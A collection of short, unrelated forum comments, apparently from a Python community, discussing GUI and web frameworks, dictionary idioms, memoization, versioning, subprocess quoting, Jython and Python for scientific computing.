Thanks. So first, I'm not totally sure this will migrate to a web interface. It's a hope based on an optimistic as-yet-to-be-seen outcome. Furthermore, one of the original motivations for doing this was to learn how to program a GUI. I'll give it some thought, but I really was hoping to begin this as a simple desktop app.
But can you recommend any good approaches or existing code? I read your paper, "Coarse Word-Sense Disambiguation Using Common Sense", but I can't find the tools you used to perform the WSD. 
Ahh, good point. So quick question. I've played with asp.net a little and thought it had a lot of drag and drop features which could have a nice little gui program. Would using iron python allow me to use the drag and drop features of .net and create that gui interface for the users but then do all the programming in Python? If so, I think that would be pretty cool. Note: I haven't played with Tkinter at all so I don't know if creating a GUI is as easy. And can you bounce back and forth between using C# and Python throughout the program? 
I think I tried something similar.. I played around with variations using itertools, but I think the overhead of the lambda function call adds too much. I was surprised that my version using sets (with the insert overhead) was faster. But thats why we benchmark, right?
Yep.. After this challenge, I went for something another, more difficult challenge: Calculating primes up to 1,000,000, on a C64 Challenge: 8 bit processor, only 64K memory (and there's 70k+ primes to be found!). Mega challenge: Do it in less than one minute. I did it.. runs in 55 seconds. I suspect that a good demo coder could crush me, but it was my first assembly in 25 years. http://www.technobabelfish.com/2014/07/calculating-primes-numbers-on-c64.html
most insightful, thanks. makes perfect sense. i was wondering what flask-sse needs redis for, guess that's exactly the architecture it goes for.
Yes came here to say the same thing. dict.get() is much better, faster for creating and accessing histograms like this. 
If it is any consolation you have greatly improved my day. Thank you for the pick me up!
Looks like he updated it recently. He wasn't even using a dict before - but I agree with changing if word not in self.all_words: self.all_words[word] = 1 else: self.all_words[word] += 1 into something like self.all_words[word] = self.all_words.get(word, 0) + 1
Thanks, this cleared up a bit of things. I'll probably switch out of IDLE since it seems to be more trouble than it's worth to get it to work than just using a different one.
Thanks, I'll give it a shot with Eclipse, as far as I've seen there is no option for that in IDLE.
Followup, I used your script. https://i.imgur.com/sOBYqO5.png
If you're new to programming, please be careful with this video. Some of the examples and opinions presented are *very* biased toward the speaker's own preferences and he sometimes demonstrates a significant lack of understanding of the alternatives he's comparing with or criticising. For example, the first example transformation, replacing nested loops with guard conditions, is a widely used and generally positive programming technique in many languages. However, you could also express the same logic both more concisely and with more explicit intent using `map` and `filter` in many languages, including Python. This idea isn't even mentioned. In a textbook for beginners, that would be reasonable, but in a talk about using better patterns and building robust large-scale applications? The C++ and Java bashing around the 29 minute mark is particularly embarrassing. I assume he's referring to techniques like templates/generics/type deduction in C++ and Java here, but those tools very much *aren't* trying to make these languages more like Python. They're trying to make the languages more concise and expressive *without* resorting to the duck typing Python relies on. Again, in a talk about building large-scale, real-life applications, it's a little rich to talking about "grueling and expensive coding disciplines" and "handcuffs" while pretending that duck typing doesn't become a significant liability at larger scales and ignoring the vast overheads of all the unit tests Python programmers wind up writing to compensate for the missing checks. Shortly afterwards, there's a lot of talk about singletons, but of all the patterns from the original Gang of Four book, Singleton is probably the one that has been most criticised (and for good reasons) and I would question almost any use of it today in almost any programming language. I don't have time to watch the second half of the talk right now, so I can't comment on whether it gets better later, but I urge anyone watching this to do so critically.
`hash()` is specifically documented to not generate unique ids.
Here's the gist: &gt;Word_Root=character(0) &gt;Count=numeric(0) &gt;for (root in roots){ &gt; //create a name set of words based on the root &gt; set_of_words &lt;- names(words[grep(names(words), pattern=root)]) &gt; // Count them &gt; n &lt;- sum(unlist(words[set_of_words])) &gt; // Append to results &gt; Word_Root &lt;- c(Word_Root, root) &gt; Count &lt;- c(Count, n) &gt;}
Well, no matter how you make your app, creating a web interface for it afterwards shouldn't be too complicated. I suggest looking into Qt for the GUI if you're not already set on a certain framework. It's really fun to work with and it's pretty well documented. If you get stuck on stuff you can PM me for help.
Just do the tutorial on the official django site. thats what I did. I think i did it 4 times before I was able to work on my own. If you are not liking django, try flask - which has less built in features, but will be easier to get off the ground with. You can also try bottle, which is even more minimal. 
Try [PythonVerbalExpressions](https://github.com/VerbalExpressions/PythonVerbalExpressions)
You can have a Python-based server running you POST the data to. But the "proper" way would probably be a message queue - either a database (ab)used for that purpose, or something like [RabbitMQ](http://www.rabbitmq.com/) or [ZeroMQ](http://zeromq.org/). Have the site put the task into the queue, have the script regularly check the queue for new tasks.
Would be even better to use a defaultdict(int) from collections? Then you can just self.all_words[word] += 1 so you don't have to worry if its not in there
I think if you already know Java then Python will seem very beautiful to you. What kind of programs are you interested in creating? I would say that a lot of the jobs are in web development, and you may want to check out Django if you haven't and are interested in that space. The Django official tutorials are very good. For hosting, using a VPS like digitalocean is really good, as you can get a full stack running and gain experience in all aspects. It's only $5/month for a pretty good setup for learning, or even for a low-moderate traffic site if you don't have too many computations.
agreed, the Django official tutorials are great
Yes, you're completely correct. But since I'm not yet completely familiar with them and Django relies on regexes for URL validation, I feel more secure using something more simpler for now. 
/u/tryexceptfuckit, you might just have my favorite programming username of all time.
Thanks! I'm going to try my best to wrap my head around Django, but an MQ seems like the easiest option.
You might want to look at `msgpack`
It's a ** p - a not a ** (p - a)
Your opinion about windows - its just Your opinion, but when You are talking about capturing key pressing on OS level - its OS bound task. So You need to write code specific to Windows in Your case. Sad, but True. And don't bound Your mind with only one language, language its just a tool for a task.
I'm sorry, I have no idea what this means. Apparently it standardized python's version system? How do you specify that? In python modules? PIP packages? Can there be multiple modules with the same name that can be imported by version now?
Indeed, that is another option! I always forget about defaultdict. Python is so full of awesome it is hard to keep track of it all.
You don't need to know much about regex to get any standard URL scheme in Django. It's quite easy to get something equivalent of Flask's `&lt;my_var&gt;`.
basically an ugly web interface to home automation systems
I am taking a python bootcamp and I just want to start learning it before the bootcamp starts. 
You can use a minimalist python framework for web. I recommend Flask, because it's very simple.
From another novice: Python 3.x is NOT backwards compatible with Python 2.x. Many programmers stick with 2.x because 3.x "broke it" and all packages/plugins/libraries have at least a version for 2.x. [Here](http://www.curiousefficiency.org/posts/2014/08/python-4000.html), a cpython core developer explains that any upgrades wont break compatibility again (everything compatible with 3.x will always work, 2.x probably stays incompatible). I suggest you try both, but always focus on the latest stable version (3.4.1 as of now). Read [this](https://wiki.python.org/moin/Python2orPython3) to help you make a choice.
Brandon Rhodes' talks are really fun. When I first found out about him, I went to [pyvideos](http://pyvideo.org/speaker/337/brandon-rhodes) and watched almost all his other talks. Very good mix of "informative" and "entertaining". They usually give great insights about the inner working of Python which are very hard to come by (except digging through the python implementation). Here are some of my favorites: [The Mighty Dictionary](http://pyvideo.org/video/276/the-mighty-dictionary-55) gives a very good explanation of how the dictionary is implemented. Might not be extremely useful, but it's really cool nonetheless. [All Your Ducks In A Row: Data Structures in the Standard Library and Beyond](http://pyvideo.org/video/2571/all-your-ducks-in-a-row-data-structures-in-the-s) goes over the basic python datastructures and their time complexities and basic implementation details. Stuff everyone should probably know. [A Python Æsthetic: Beauty and Why I Python](http://pyvideo.org/video/1599/a-python-sthetic-beauty-and-why-i-python) is a more subjective talk about how to write beautiful code. Learned a few cool tricks from this to make my code even cleaner.
Took me a bit to figure out the difference between the two.
&gt; Which bugs? I think he mentions something like three across the five blog posts, and he mentions that two of them have been fixed. Either `functools.wraps()` should do all of the things he discusses automatically, or (since AFAICT that might not be technically possible) it should be deprecated and replaced with something better. In either event, these are not things end-developers should be worrying about. If I received a bug report involving a decorated function in my library not doing these things, I would WONTFIX it. A bug, generally speaking, requires expected behavior, actual behavior, and steps to reproduce, but we usually also expect something in the documentation which says (implicitly or explicitly) the actual behavior is wrong and the expected behavior is right. My documentation does not actually say function X is a function. It says you can call `X(a, b, c)` and if you pass the correct arguments, certain things happen. Strictly, `X` is a callable object, which may or may not be implemented as a function behind the scenes. There is *certainly* no contractual guarantee `inspect` will be able to get any sensible information out of it.
Seriously, take /u/mackstann's advice.
Coming from a c++ background, [codecademy](http://www.codecademy.com/en/tracks/python) helped tremendously learning python.
Just a heads up the lecture repeats after 17:25, so fast forward to there. 
Can't forget [The Naming of Ducks: Where Dynamic Typing Meets Smart Conventions](http://pyvideo.org/video/1676/the-naming-of-ducks-where-dynamic-types-meet-sma) Great video guide about how to properly take advantage of a duck-typed language with proper variable naming/usage/style!
Thanks a lot! This is definitely helpful.
From a learning perspective the differences between the two are negligible, anyone that can Code in Python 2 can code in Python 3. As long as you remember that Print is a Statement in 2 and a Function in 3, and a few other things. (But mainly that one.)
I'm glad you like it! 
I thought I was going crazy at first.
how about giving some constructive criticism. what are some things wrong with it?
You're going to be blown away by `([]==[]) + 1` then.
ZODB was heavily influenced by Smalltalk. The transparent persistence system is very similar to working in a Smalltalk image.
This may help you http://maxburstein.com/blog/python-shortcuts-for-the-python-beginner/
You. I like you.
You are not the only one
Same shit really, just functional, not class-based. In [1]: def memoized(func): ...: d = {} ...: def wrapped(*args): ...: if args[0] in d: ...: return d[args[0]] ...: d[args[0]] = func(*args) ...: return d[args[0]] ...: return wrapped ...: In [2]: @memoized ...: def fib(n): ...: if n in (0, 1): return n ...: return fib(n-1) + fib(n-2) `memoized` there returns a function that remembers its answer for the one argument parameters, easily hacked to take any number of args though, like the class. A closure is a function in reference to an environment, that being the dict `d` in my example. Usually in programming, you see closures as being functions with variables that are specific to them, usually as functions that return functions in that environment. Honestly, his class is pretty much a closure because it references a function and environment, `self.memoized`. My only real criticism of his example is that it try/excepts the keyerror, and the KeyError will happen once per argument value. Exceptions are for exceptional cases, and this is not an exceptional case. It will happen, without any error in the parameters or code. It's a given. So, IMO, it's best to check if `args` is in `self.memoized`. We have "zero-cost" exception handling, which means it's pretty much free computation wise to put try/except where it needs to be, *BUT* it's expensive when it actually hits an exception, thus exceptions should be an exceptional case. And it doesn't fall in premature optimization... it makes sense when reading code for exceptions to always be for error cases. They should not be used as logical statements like a condition check unless that condition means there's an error.
I did not like ZeroMQ and ended up rolling my own using `sockets` -- the easiest way to communicate a browser with a python script is a micro framework like `bottle` or `flask`. If you want real-time communication you'll want a server that can do websockets, like `Tornado` or `gevent`. Then use a client library such as `socket.io` If you just want to POST/GET periodically use something like `json.Ajax` with your micro framework.
Message me if you want someone to bounce ideas/code off of on this ... I'm developing something similar for work right now, and your thing sounds a lot like one of my sub-modules Skream; it's a super fast, scalable, IO queue. There is a CLI and Web interface to interact. I might be able to give you some pointers.
Did you try passing it in as a single string, or as a list and not a tuple? Popen manipulates the `cmd` portion into a list of arguments where the spaces go.
5000-5100 are for TCP 8080-8085 are my HTTP services 6607-6697 are my logging services (type it in a calculator, hehe) 16607+ are for UDP
Yes, this is a big use case for IronPython ... the Win32 UI apps. I've also been recommended to use IronPython/Jython for multithreaded applications; not multi-process...because of their superior thread implementation.
Use what you're already familiar with until it doesn't fit your needs.
IMO you'll have an easier experience with Python for simple PDEs, and should be able to solve them pretty quickly. If you start pushing the performance limits of Python on things like the full-blown navier stokes then you might end up wanting to move to something that can take more advantage of parallelism. But to get you going, Python is a great start.
Python's a great choice for numerical analysis -- [FiPy](http://www.ctcms.nist.gov/fipy/) is a great example of some of the high-level packages that are available to help you get bootstrapped doing numerics on PDEs. Additionally there are a lot of lower-level libraries (scipy, numpy) that're more generic.
Well, I guess in some situations, having a persistent ad-hoc bag of objects (with ACID properties) is a feature. 
OK. Thanks.
Do you know why they use finite volume rather than finite difference? I thought the latter was more common in engineering problems. 
Why is it so hard to plot pandas series? Why do you have to break the data out into lists before plotting?
LOL lightweight, maybe you should spend more time at the gym and less time being a PROGRAMMING DORK. jk this is cool and you're cool - we cool?
Ich never ever thought about versioning any different from the widest standard of major.minor.micro or in terms of additions to the code incompatibleMajorFeature.compatibleMinorFeature.bugfix. I find this way far too obvious and I never understood why people need anything else, except of course things like alpha, beta, rc etc.
I was working on my PhD in Numerical analysis, specifically solving hyperbolic PDEs. I loved Python for it. Of course, I was writing all of my solvers myself, so I'm not sure how good any of the available packages are, but the environment is extremely friendly. Most numpy functions are very fast, and if you have big loops, you can optimize them in Cython. I was getting speeds roughly comparable to my c++ code I had written. I learned Python basically exclusively to solve PDEs in and I don't regret it. With tools like IPython and pycharm, you can basically get the friendliness of MATLAB and the speed of c. 
My vote goes to Bottle. Way easier than Django and even easier than Flask. Good tutorials and examples around for Bottle too. If you are just starting out, then you can get lost in Django's massive set of features and flexibility, and wind up focussed on the framework instead of the problem. My two cents.
"Computational Physics with Python" is a good graduate level source. Some of the text and code is available for free at the author's website [http://www-personal.umich.edu/~mejn/computational-physics/] , but reading the whole book is highly recommended. I am pretty cheap, and I don't buy many $40 books, but this one was worth it.
I'm a Physics PhD student working on computational fluid dynamics, mainly direct numerical simulations of turbulent flows, so yeah, lots of lovely nonlinear PDE's. I do use a fair sized cluster to run my simulations and the code I use is written in Fortran and was mainly developed by my advisor, who ran it in pretty big computers ([this](http://en.wikipedia.org/wiki/Kraken_%28supercomputer%29) big I mean). If you really want to get in the numerical stuff, and especially into high performance computing, C and Fortran is where it's at. Learn how to properly code in these languages and how to use parallelize your code (MPI, OpenMP or, maybe, CUDA), and you can forget about libraries such as blitz and boost and whatever. You want good, clean and portable code. That being said, Python is very useful for post-processing data, and it's also great to quickly implement methods or for small simulations. Also, once you learn a couple of languages learning a new one isn't as hard. One big advice I can give if you want to do numerical simulations is to learn to love the command line. When I started my PhD I was already very comfortable with it, and I noticed that it gave me an edge over more advanced students when it came to messing with the cluster and such, all thanks to countless hours spent in front of the terminal. To finish off, go talk to the research group in question! Ask them about their research and what tools they use, show interest. So when the day in which you ask to work there comes they already know your face and you already know more about the place. Networking is VERY important in scientific research, never underestimate its importance. If you have any questions feel free to ask me. **TL;DR**: Learn Fortran :) 
&gt; Easier than Flask Not really, Bottle's simplicity would probably be a burden on him.
[Python Computations in Science and Engineering](http://kitchingroup.cheme.cmu.edu/pycse/pycse.html) is a nice resource.
I didn't see OP. But on a related note to what you just said... I'd imagine that even though you may have an understanding of programming in general (what with your previous escapades with Java and c#)...you are still going to be taught from the ground up. It's not necessarily going to be beneficial learning a little bit before you start this boot camp as what you might have learned on your own will probably conflict with the way this boot camp is teaching you. Have fun though, python is a great all round programming language. 
Just out of curiosity, are there any plans to eventually support Python 3? I realize this is not a trivial task, but Jython would be substantially more interesting to me in that case.
Not that I know of. A solution is on my todo list (create a fake package with stubs for PyCharm to import) In the meantime you have to look things up manually: https://lazka.github.io/pgi-docs/
Well, the [GIL](https://wiki.python.org/moin/GlobalInterpreterLock) is not incredibly nice. I realize there are ways to sidestep it by spawning completely different Python subprocesses, but that seems like somewhat of a cop-out compared to true concurrency. More importantly, Python is just not very performant in the first place. I've noticed the math department at my university moving from Python/Mathematica/Matlab to CUDA because their solvers don't run fast enough. The stuff in Python that *is* pretty fast, like NumPy, is usually just a huge bundle of calls to C or FORTRAN libraries, with a bunch of convenience wrappers in Python.
Any plans to support ctypes?
Does anybody know if Oracle and IBM have any plans to get on with the times and replace their current Jython 2.2.1 used in Weblogic and Websphere? They seem stuck in 2007 for no good reason (I bet 99% of 2.2.x code would work fine on 2.5.x and even 2.7.x). 
Yep. Start using it for everything you _can_ use it for. Contribute to open source frameworks when time allows. Mostly, solve the problems you need to solve with Python -- this will help the most.
The trickiest part (unicode support) is already done,...
A list of a few more must-watch Python videos (along with their resources): https://github.com/s16h/py-must-watch 
No argument there, but I think the fundamental limitations of OO as a programming style are a separate issue to the trade-offs you make in choosing a dynamic or static type system. Whether you use a static class-based system like C++/Java/C#, or something more dynamic like Python, or a message-passing style like Smalltalk, you still have to contend with OO's inherent weaknesses in state management, working with structured data, and so on. I think the infamous "enterprise code" designs, particularly in Java, are usually more attributable to these weaknesses of OO as a design style than to the weaknesses of static type systems as an implementation tool.
WoW. No Script blocked that entire page. Not a single element loaded.
Or, you know, *unix domain sockets*.
If you've got a ton of infrastructure already created in some other language, then the best method would be to use sockets to communicate to and from. If you've got the ability to start from scratch, then there is absolutely no question that you should use a py web framework like django, flask, or web2py. My personal favorite is flask, but each of them has their own pros and cons. You should try tutorials on all 3, and see which one "fits" you best!
Not 3.75 faster for n=10,000,000 One-liner -------------------------------------------------&gt; 2.230 sec Rhomboid ------------------------------------------------&gt; 1.124 sec 2X http://code.activestate.com/recipes/366178/ ---------&gt; 0.156 sec 14X
That's blogspot for you.
I used Jython once. It crashed my browser. 
So was that supposed to be funny or something?
thanks, Yeah the gaps are created purposefully by rotating the longs randomly upon creation, this allows for the random gaps. I'm going for a log cabin/wilderness shelter look. I have to make the logs a bit thicker to reduce the size of the gaps.
No just my own personal experience. 
I've been using FiPy for the last year to solve a PDE. It is very easy to set up simple problems and you can start generating useful output in a short period of time. I've found towards the last few months that it's too slow with no obvious pathway to improving performance. There's no support for GPU computation, despite the task being well suited to parallel execution, i.e. each cell can be evolved independently. The project hasn't received an update in about a year so I wouldn't depend on it for anything. I would recommend finding an appropriate library in C++ or C# that will benefit you. At the moment I cannot recommend FiPy for complicated tasks, or indeed python as it is not a mature enough language yet.
now that's a good idea, thanks!
It's so obvious that it ends up not covering some possible cases. The PEP basically codifies the standard practice used by many Linux distributions that have to deal with all kinds of projects and a non-trivial chain of contributors. a) The epoch preceding the version numbers exists basically as a safeguard if some major screw up/upheaval happens and the version sequence has to be completely reset. It should never be used otherwise. b) The version component is, as you mentioned, the traditional numeric standard. Nothing too special about it. c) Next comes the pre-release tag, which is also quite traditional. I don't understand why they went with 'c' over 'rc' when the former is much more common though. Not a big deal, but a bit puzzling. d) The post release tag is roughly equivalent to the packager tag in Linux distributions. It is meant to signal changes that don't affect the actual code, but include packaging fixes, documentation updates, etc. It has to exist, or otherwise it makes it quite difficult to ever fix a packing error once it enters the wild. d) The dev tag exists basically for nightly builds, so they can be identified as the version they are meant to become, but include the version control revision too. e) The local tag exists to clearly identify distributor patches/changes in the version name. The biggest difference is that the post-release and dev tags are explicitly labeled, unlike in e.g. the Debian world.
First of all, you need to understand how Python and the OS deal with commands. On UNIX systems, programs don't actually ever receive one single string for their arguments, only an already split list of strings. Whatever interpreter/library is used to start the process is responsible for splitting a string into a list. Shells do that by using spaces as separators. Therefore, when working with them, you need quotes around arguments that should actually contain spaces. But when you're sending an argument list yourself, quotes are not needed: the splitting is all onto you, and quotes have no special meaning. Windows is a bit different. The canonical argument representation is a single string, and that is what the CreateProcess WinAPI function receives. It is then split up automatically by the C-library for the called program for compatibility. This means that when you call Popen with a list, your command will be converted to string first, then converted *back* to a list eventually. You can read the rules on how the conversion in the [subprocess module documentation](https://docs.python.org/2/library/subprocess.html#converting-argument-sequence). But you don't have to actually care about how the conversion will happen: the suprocess module deals with it all. So your list should contain *exactly* what you want each argument to be, no extra quotes involved. Like this: `("certutil.exe", "-view", "-restrict", "NotAfter &lt;= now+30:00, NotAfter &gt;= now+00:00")` Which will be converted to something like this: `certutil.exe -view -restrict "NotAfter &lt;= now+30:00, NotAfter &gt;= now+00:00"` Then hopefully be correctly converted back by certutil.exe.
Not on Windows: it passes the string straight through because that is the canonical representation, which differs from the UNIX world.
I'm not too comfortable with python or sql queries (yet), but isn't there some way to search for word delimiters? Like, in vim, you could search for regex /&lt;c&gt;/ which would match the c's in ' c ', ' c.', ' c,' ' c)', '(c ' etc, but not c preceded or followed by another text character or number.
Yes, SQLite does support regex, but I am note sure, if the single letters are not used too often without meaning the programming languages. And I did not want to audit and clean the results manually. ;)
Strings are immutable, so when you do: `mystring = mystring + "STOP"`, you are really just creating a new string and assigning it.over the `mystring` variable. That'll probably shadow the global in your thread handler, which means the changes won't propagate out. You could.use the `global` keyword to make it refer to.the original, and as variable overwrites are instantaneous it should not lead to an obvious crash, but the simultaneous access and overwriting could certainly lead to errors. Take for example two threads accessing the global: one checks it.for a given state and enters a branch at an if statement. The other changes it, and now the first is in an undefined state where it thinks the variable is.one thing but it no longer is. If you're gonna do this (don't?), acquaint yourself with locks; a data structure that simply prevents simultaneous access to itself, so if you make code get the lock prior to the string, and only release the lock when finished with the string (hint: locks support `with` blocks), you'll avoid a lot of headaches.
How so? It doesn't run in the browser at all...
I recall it supporting ctypes, but it's not 100%.
I haven't had any interest in Jython but I recently played with Vert.x which seems like it has a lot of potential for building big sprawling web apps that tie heterogenous systems together and for implementing async features like websocket enabled apps. Also it seems easy to deploy. But I am also tempted to tackle using Tornado running on python 3.4 and just keep to doing things in a pure Python manner.
Kudos that is pretty slick, but I don't see any reason to run under a crippled shared enviroment when inexpensive VPS accounts are available from linode and digital ocean starting at $5 to $10 a month.
Py 3.3 changes the definition of [edit: the `str` type] such that a UTF-16 based implementation no longer suffices, as you must be able to represent all codepoints instead of merely all scalar values, which means they can't use Java's String type any more. The intention is to move both bytes and str away from String, AIUI.
Guy sounds like an idiot. It'd break core and common practices already established in the language. It would be trivial to make @int a type decorator as a reserved decorator namespace. Removing established features without better merit for removal should be unwelcome input.
The tuples aren't necessary, you actually want to slice a Series from the DataFrame. You want to add parse_dates=True and index_col='Date' to read_csv, which will remove the need for dateutil. Then squat data is just plotting a column and the others are just a column with a Boolean mask.
You can use Python for every task you can imagine. I prefer using Python for the following: - Scientific tasks and libraries in academia - Data Analytics - Server side Programming, mainly scripts - Administration tasks through scripts - Web applications, through different Web frameworks, like web2py, Django, Flask, etc.
It was some interactive browser based interpreter with a bunch of examples. I don't remember. I still don't understand the need for *ython. Too many derivatives. I use normal python and do just fine with my coding.
Sure, you can most certainly do that. Take a look at some web development frameworks like django, flask, web2py, etc. I prefer flask to be honest.
There's a lot you can do. I don't know much about aerospace but I did one related project. For my college I did one small qt application for amateur airspace enthusiasts (various air crafts, parachute jumping, aircraft models etc.) that scrapes weather data in particular locations from various websites(i.e. wunderground) with Requests and BeaituflSoup4. Then that data is filtered and passed to various delivery systems using smtplib for email and Twilio for sms. And at the end all that was wrapped in nice Qt GUI (via PySide). So basically what it did is check the day or few and find the hours that met users weather forecast filters, i.e. I want to go out and play around with my quadcopter but wind above 10m/s will blow it away, so I set up filter to send me the hours when I can enjoy my hobby. With Python possibilities are pretty much endless. Have fun!
[SciPy](http://scipy.org/) may give you some ideas about scientific computing with Python.
I think what Battleroid is trying to point out is "yes". You can use Python for web app development. There are many libraries and frameworks to help you do so depending on whether you want to be the server-side, the client-side, or an application suite of both sides. On the server side, get familiar with [bottle.py](http://bottlepy.org) which is really easy to learn; when you feel ready you can step up to more expansive frameworks like [Django](http://www.djangoproject.com) &amp; [Flask](http://flask.pocoo.org). On the client side, check out [requests](http://python-requests.org/) and [httpie](http://httpie.org). I'm not into aerospace engineering so I can only guess what your needs are, I'd say stuff like [pandas](http://pandas.pydata.org) and [matplotlib](http://matplotlib.org) for data analysis. On that topic, you will want to get [Anaconda Python](http://continuum.io) which will give you more data analysis tools than you'll possibly use right now (including both the aforementioned of course). Python is a great language with a large ecosystem and community, and can solve problems in any application. An experienced programmer would not whack every nail with their Python hammer, but the diversity makes it great to learn this one language very well and do well in a variety of things. For example, if you learned matlab for your data analysis, then you cannot use that to also do your web applications, so you're forced to learn something else again. That just sounds inefficient to me. You can embed Python into another application in another language for the purposes of providing a user-friendly scripting capability to end-users that aren't suitable to learn C (arts students ;) E.g. you could write a C&amp;C application for a particular microcontroller, and embed python to script the movement commands. You'll see tons of examples of this with the Raspberry Pi / Arduino infrastructure. It's also possible to do the inverse - write an application in Python and then use the exported API from a library written in C/C++ in that app. You can also use tools like [numba](http://numba.pydata.org) and [cython](http://cython.org) to speed up certain portions of your Python app by compiling those bits for you. Cython can also build the entire program, so its an easy way to provide a binary to others. As someone who is not a full-time application developer, Python is a perfect language for me as I can do everything I want in it, it runs "fast enough", and I'm just getting the real job done with it. If you're serious about web apps, you will also want to learn Javascript as the runtime is embedded in the browser and all the front-end UI code uses it (libraries like bootstrap, uikit, etc). You write the server-side in Python, you can also build a client-side app in Python (e.g. on a mobile using [Kivy](http://kivy.org)) but part of the server-side frontend will require JS if its going to be "humanized" 
Choosing lottery numbers in the UK. Euro Millions python -c "from random import sample; print 'EuroMillion numbers: %s %s' % (sample(range(1, 51), 5), sample(range(1, 12), 2))" Lotto python -c "from random import sample; print 'Lotto numbers: %s' % sample(range(1, 50), 6)" Thunderball python -c "from random import sample; print 'Thunderball numbers: %s %s' % (sample(range(1, 40), 5), sample(range(1, 15), 1))"
It sounds like the delay between write-fire-catch-read is long enough that an explicit lock is not needed. However, you should consider using some guaranteed thread-safe object (like a queue) if you extend your threads further than two.
That sounded amazing theres alot of terms i didn t get like API but i mean i just started the codecademy Python. After im done where should i go next? to learn more i mean 
Your numbers are completely different than mine: &gt;&gt;&gt; n = 10000000 &gt;&gt;&gt; %timeit primes_below1(n) # one-liner 1 loops, best of 3: 3.15 s per loop &gt;&gt;&gt; %timeit primes_below2(n) # my version 1 loops, best of 3: 849 ms per loop &gt;&gt;&gt; %timeit primes_below3(n) # activestate recipe 1 loops, best of 3: 2.02 s per loop &gt;&gt;&gt; 3.15/.849 3.7102473498233217 &gt;&gt;&gt; 2.02/.849 2.3792697290930507 My version is 3.71x faster than the oneliner, and is 2.38x faster than the linked recipe. 
The library uses native widgets.
Beginner programmer here. What are the use cases for Jython? 
Since the comments are here are pretty unhelpful... Jython is python code that is compiled into Java byte code which can be run on the Java Virtual Machine. This has a few benefits like the ability to easily interoperate with Java or any other language built on the JVM (Groovy, Scala, Clojure, etc...). The other big benefit is that in CPython multithreaded code is pretty much impossible due to the GIL. Jython has no sure restriction and multiple thread can be run natively. There are other reasons but these are the main two I see.
Yeah Python stumbles when you start crushing things. 
sorry, those are the words I use talking about events. Event is issued, then the listening worker "catches" it.
Thanks!
describe the tech behind this "web page"
Sure, now that wbeyda crashed it.... had to ruin it for the rest of us....
Not sure where the `ctypes` support is, but I know Jim Baker has been investigating what it would take to support `cffi`.
I'm not sure I'd endorse this as this would add overhead to parsing comments which are currently stripped before the language is compiled as far as I'm aware. Would probably be asking for performance issues in heavily commented projects.
You raise a good point. Maybe prefix it with ##, so it's easy to rule out (nearly) all comments vs typing markup?
The options for me in python are: pickle for one-off binary blobs of simple data; json or xml for intermediate complexity data (but not large volume data); and then a real SQL db like sqlite, Maria, or my favorite Postgres. Sqlite is great if you don't need much write concurrency but Postgres is still my go to if I can install a Postgres server. 
You should just start reading tutorials and trying out the code through the interpreter, there really is no other good way to learn it. Just dive in, what are you waiting for?
wth was I thinking when I wrote this xD
xDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
I'm also an aerospace engineer, and I'm a huge fan of Python... So awesome to see another Aero here in the Python world! I started programming with MATLAB and Excel VBA, and eventually had a programmer buddy who suggested Python... In the last 3 years I've been diving in and am now building professional data analysis tools for my team, and wrapping and streamlining legacy tools with powerful GUIs. As an engineer, if you're in a Windows environment with non programmers, learning how to interact with Excel can be extremely useful. Engineers love their spreadsheets and finding a balance between pure Excel, Excel + VBA, VB.net Excel Add-ins, MATLAB, and Python has been the juggling act that has made me a successful engineer/analyst/programmer/computer guy on my team. I love python because it gives tons of capability, has elegance, great for rapid application development, strong scientific libraries (numpy, scipy, pandas, matplotlib, pyqtgraph, mayavi), awesome community, free (I can learn and practice at home, the skills are transferable since it's almost always available, and free -&gt; bigger community). The only downside for me is that I've yet to get any of my coworkers using Python... programming is basically optional for my job, and those I know who do program use MATLAB, which is the default hammer for nails bigger than Excel can hit. My biggest challenge on a team where no one has python is deployment of an executable. It's very doable (I use py2exe, esky, and inno installer), but Python is less well set up for deployment than say VB.net, c#, Java, etc. Another minor challenge is that the python world is more associated with Linux than Windows. The only folks I know using Linux at my job are the computational fluid dynamics (CFD) folks... Everyone else is PC (plus a few macs for managers and people with artistic jobs like marketing/graphic design). I still love python on Windows, but I'd love it on Linux even more, because it's 100% at home there. In my experience, I wouldn't be surprised if you encounter legacy code that is ancient FORTRAN (aerospace has gobs of it still firmly in use... one of my projects is wrapping a combination of two 100000-line Fortran codes) or variants of Basic. I've heard a lot of engineers used Basic/VB up until VB6 became VB.net, which no one liked, and so they switched to MATLAB because of its similarities to Fortran. If you're a programmer/engineer I'm sure you can pick up Fortran when necessary, but don't be surprised by it, and it doesn't hurt to have on an engineering resume. Well, I was just looking to say hi and wound up rambling... If the flavor of my comment is different from others in the python world, then I hope maybe I've shed some light on being a programmer amongst old-school engineers. Good luck! Enjoy Python!
If someone is really interested in design practices in Python, here is a great book for that [Python in Practice by Mark Summerfield](http://www.amazon.com/Python-Practice-Concurrency-Libraries-Developers/dp/0321905636/ref=sr_1_1?ie=UTF8&amp;qid=1408863130&amp;sr=8-1&amp;keywords=python+in+practice)
As a fellow engineer, when people use programming or computer science terms you don't get, take it as a learning opportunity and Google it, look it up on stack overflow, etc. In addition to the python resources listed on the right, and the numerous mega lusts of online python resources, there are also videos of talks from conferences like pycon which are collected on pyvideo.org. I've learned a ton from conference videos, which range from beginner to advanced. Also I think I listen better to awesome British/Irish/Australian accents! This also give me a feel for how people talk about python, how they pronounce things, and how they work in their computer sometimes. Since I'm alone as a python programmer at my job, watching others is great on multiple levels.
I have no django knowledge to provide context, but I agree with those suggesting you spend 15 minutes learning regex basics, then learn more as needed.... Your foo&lt;int&gt;bar would be foo\dbar because \d matches a single digit. You could also do foo[0-9]bar, or if you need it to match 1 or more digits foo\d+bar ... Or foo[0-9]+bar because + means 1 or more of a pattern. Regex is just pattern matching, with handy symbols for certain patterns. Also, there are millions of examples online to follow and regex questions on stack overflow get answered like lightening ... It's low hanging fruit for any programmer to earn some reputation points answering your question... Don't settle for something because it's "easy for a noob" ... Simplicity and elegance have huge advantages for the experienced and novice. You won't be new forever, so make choices now that will still be valid once you've got mad skillzorz (or whatever noobs call experience)
ctypes is supported in Jython 2.5+ (I use it).
Great. Thanks.
You are absolutely right. But i had a hosting from them, i did it beacuse i can. Digital Ocean is way better than Hostgator's shitty shared hostings.
If you are interested in making games it can be done with Python but Lua could be a better choice for making games. 
&gt;Javescript runs in real time. I don't know how to do that with Python. what
